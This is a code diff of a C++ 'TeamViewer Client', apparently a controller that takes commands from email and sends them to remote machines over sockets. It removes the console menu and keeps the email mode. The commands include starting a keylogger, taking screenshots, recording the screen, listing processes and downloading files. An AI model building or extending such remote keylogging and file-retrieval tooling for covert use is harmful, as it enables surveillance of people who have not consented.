@@ -5,7 +5,6 @@
 #include "src/config.h"
 #include "src/email_utils.h"
 #include "src/email_function.h"
-#include "src/ServerManager.h" 
 
 #include <iostream>
 #include <string>
@@ -20,44 +19,16 @@
 #include <thread>
 #include <curl/curl.h>
 #include <atomic>
-#include <conio.h> // For _kbhit() and _getch()
+#include <conio.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
 namespace fs = std::filesystem;
 using namespace std;
 
-enum class ClientMode {
-    CONSOLE,
-    EMAIL
-};
-
-// Global variables - much simplified now
 atomic<bool> stopEmailMonitoring(false);
-ServerManager* serverManager = nullptr;  // Global instance of ServerManager
 
 bool processEmailCommand();
-
-void displayMenu() {
-    system("cls");
-    cout << "\n========== TEAMVIEWER CLIENT MENU ==========\n";
-    cout << "1. Switch to Email Mode (Current: Console Mode)\n";
-    cout << "2. Manage Servers\n";
-    cout << "3. Send Command to Server\n";
-    cout << "4. View Connection Status\n";
-    cout << "5. Quick Connect/Disconnect\n";
-    cout << "6. Exit\n";
-    cout << "============================================\n";
-    
-    // Display current connection info using ServerManager
-    cout << "Current Server: " << serverManager->getCurrentServerString() << endl;
-    cout << "Status: " << (serverManager->isConnected() ? "CONNECTED" : "DISCONNECTED");
-    if (!serverManager->getConnectionStatusMessage().empty()) {
-        cout << " (" << serverManager->getConnectionStatusMessage() << ")";
-    }
-    cout << endl;
-    cout << "Choose option: ";
-}
 
 void displayEmailModeMenu() {
     system("cls");
@@ -76,43 +47,17 @@ bool waitForInput(string& input, int timeoutSeconds) {
     cout << "Type 'stop' and press Enter to exit monitoring, or just wait..." << endl;
     cout << "> ";
     
-    // Set up for non-blocking input with timeout
     auto start = chrono::steady_clock::now();
     while (chrono::duration_cast<chrono::seconds>(chrono::steady_clock::now() - start).count() < timeoutSeconds) {
         if (_kbhit()) {
             getline(cin, input);
-            return true; // User provided input
+            return true;
         }
         this_thread::sleep_for(chrono::milliseconds(100));
     }
     
     cout << "\nTimeout reached, continuing monitoring..." << endl;
-    return false; // Timeout, no input
-}
-
-void displayCommandMenu() {
-    system("cls");
-    cout << "\n========== AVAILABLE COMMANDS ==========\n";
-    cout << "1. startkeylogger - Start keylogger\n";
-    cout << "2. stopkeylogger - Stop keylogger and get log\n";
-    cout << "3. screenshot - Take screenshot\n";
-    cout << "4. record <duration> - Record screen (seconds)\n";
-    cout << "5. listProcess - List running processes\n";
-    cout << "6. listApp - List installed applications\n";
-    cout << "7. getDxdiag - Get system information\n";
-    cout << "8. listDir <directory> - List files/folders in a directory\n";
-    cout << "9. getFile <filepath> - Download file from server\n";
-    cout << "10. Start <service> - Start a service\n";
-    cout << "11. Stop <service> - Stop a service\n";
-    cout << "12. Shutdown - Shutdown server\n";
-    cout << "13. Reset - Reset server\n";
-    cout << "14. Custom command\n";
-    cout << "15. Back to main menu\n";
-    cout << "=======================================\n";
-    
-    // Show connection status using ServerManager
-    serverManager->displayConnectionStatus();
-    cout << "Choose option: ";
+    return false;
 }
 
 bool connectToServer(SOCKET& clientSocket, const string& ip, int port) {
@@ -203,7 +148,6 @@ bool processCommand(SOCKET clientSocket, const string& command, const string& fr
     bool expectFile = false;
     bool isEmailMode = !fromEmail.empty();
     
-    // Determine if command expects file response
     if (command == "stopkeylogger" || command == "listProcess" || command == "getDxdiag" || 
         command == "listApp" || command.find("record") == 0 || command.find("screenshot") == 0) {
         expectFile = true;
@@ -231,7 +175,6 @@ bool processCommand(SOCKET clientSocket, const string& command, const string& fr
         fileName = Config::DIRECTORY_LIST_RECEIVED_PATH;
     }
 
-    // Create and send command file
     CreateCommandFile(command);
     if (!SendFile(clientSocket, Config::COMMAND_FILE_PATH)) {
         cout << "Failed to send command file" << endl;
@@ -272,7 +215,6 @@ bool processCommand(SOCKET clientSocket, const string& command, const string& fr
                                 }
                             }
                         } else {
-                            // Console mode - just notify file saved
                             cout << "File saved to: " << fileName << endl;
                             cout << "You can find the file at the above location." << endl;
                         }
@@ -319,7 +261,6 @@ bool processEmailCommand() {
     cout << "Email content read: IP:Port = " << ipPort << ", Command = " << command << ", From = " << fromEmail << endl;
     LogToFile("Email content read: IP:Port = " + ipPort + ", Command = " + command + ", From = " + fromEmail);
 
-    // Process shutdown/reset commands from email
     string finalCommand = command;
     if (command == "shutdown") {
         finalCommand = "Shutdown_Reset shutdown";
@@ -331,7 +272,6 @@ bool processEmailCommand() {
         LogToFile("Converted email command 'reset' to 'Shutdown_Reset reset'");
     }
 
-    // Parse IP and port
     size_t colonPos = ipPort.find(':');
     if (colonPos == string::npos) {
         cout << "Invalid IP:port format: " << ipPort << endl;
@@ -350,7 +290,6 @@ bool processEmailCommand() {
         return false;
     }
 
-    // Connect and process command
     SOCKET clientSocket;
     if (connectToServer(clientSocket, ip, port)) {
         bool result = processCommand(clientSocket, finalCommand, fromEmail);
@@ -359,112 +298,6 @@ bool processEmailCommand() {
     }
     
     return false;
-}
-
-void runConsoleMode() {
-    while (true) {
-        displayMenu();
-        
-        string input;
-        getline(cin, input);
-        
-        if (input.empty()) continue;
-        
-        int choice;
-        try {
-            choice = stoi(input);
-        } catch (...) {
-            cout << "Invalid option. Please try again." << endl;
-            cout << "\nPress Enter to continue...";
-            cin.get();
-            continue;
-        }
-        
-        switch (choice) {
-            case 1: // Switch to email mode
-                if (serverManager->isConnected()) {
-                    serverManager->disconnectFromServer();
-                }
-                return; // Return to main to switch mode
-                
-            case 2: // Manage servers
-                serverManager->manageServersMenu();
-                break;
-                
-            case 3: { // Send command
-                if (!serverManager->isConnected()) {
-                    cout << "Not connected to server. Please connect first." << endl;
-                    cout << "\nPress Enter to continue...";
-                    cin.get();
-                    break;
-                }
-                
-                while (true) {
-                    displayCommandMenu();
-                    getline(cin, input);
-                    
-                    if (input.empty()) continue;
-                    
-                    int cmdChoice;
-                    try {
-                        cmdChoice = stoi(input);
-                    } catch (...) {
-                        cout << "Invalid option. Please try again." << endl;
-                        cout << "\nPress Enter to continue...";
-                        cin.get();
-                        continue;
-                    }
-                    
-                    if (cmdChoice == 15) { // Back to main menu
-                        break;
-                    }
-                    
-                    string command = getCommandInput(cmdChoice);
-                    if (!command.empty()) {
-                        cout << "Executing command: " << command << endl;
-                        processCommand(serverManager->getSocket(), command);
-                        cout << "\nPress Enter to continue...";
-                        cin.get();
-                    } else {
-                        cout << "Invalid command option." << endl;
-                        cout << "\nPress Enter to continue...";
-                        cin.get();
-                    }
-                }
-                break;
-            }
-                
-            case 4: { // View connection status
-                system("cls");
-                serverManager->displayConnectionStatus();
-                cout << "\nPress Enter to continue...";
-                cin.get();
-                break;
-            }
-                
-            case 5: { // Quick connect/disconnect
-                if (serverManager->isConnected()) {
-                    serverManager->disconnectFromServer();
-                } else {
-                    serverManager->connectToSelectedServer();
-                }
-                cout << "\nPress Enter to continue...";
-                cin.get();
-                break;
-            }
-                
-            case 6: // Exit
-                if (serverManager->isConnected()) {
-                    serverManager->disconnectFromServer();
-                }
-                return;
-                
-            default:
-                cout << "Invalid option. Please try again." << endl;
-                cout << "\nPress Enter to continue...";
-                cin.get();
-        }
-    }
 }
 
 void runEmailMode() {
@@ -498,7 +331,6 @@ void runEmailMode() {
 }
 
 int main(void) {
-    // Initialize curl
     CURLcode curlInitRes = curl_global_init(CURL_GLOBAL_ALL);
     if (curlInitRes != CURLE_OK) {
         cout << "curl_global_init() failed: " << curl_easy_strerror(curlInitRes) << endl;
@@ -506,10 +338,8 @@ int main(void) {
         return 1;
     }
 
-    // Create temp directory
     fs::create_directories(Config::BASE_DIR + "temp_client/");
 
-    // Initialize Winsock
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         cout << "WSAStartup failed: " << WSAGetLastError() << endl;
@@ -518,27 +348,18 @@ int main(void) {
         return 1;
     }
     
-    // Initialize ServerManager
-    serverManager = new ServerManager();
-    
     cout << "========== TEAMVIEWER CLIENT ==========\n";
     cout << "Welcome to TeamViewer Client!\n";
-    // cout << "You can switch between Console mode and Email mode.\n";
     cout << "=====================================\n";
     
     LogToFile("Client started");
     
-    ClientMode currentMode = ClientMode::EMAIL;
-    
     while (true) {
-        currentMode = ClientMode::EMAIL;
         cout << "\n--- Entering Email Mode ---\n";
         runEmailMode();
         break;
     }
 
-    // This should never be reached, but just in case
-    delete serverManager;
     WSACleanup();
     curl_global_cleanup();
     LogToFile("Client exited");
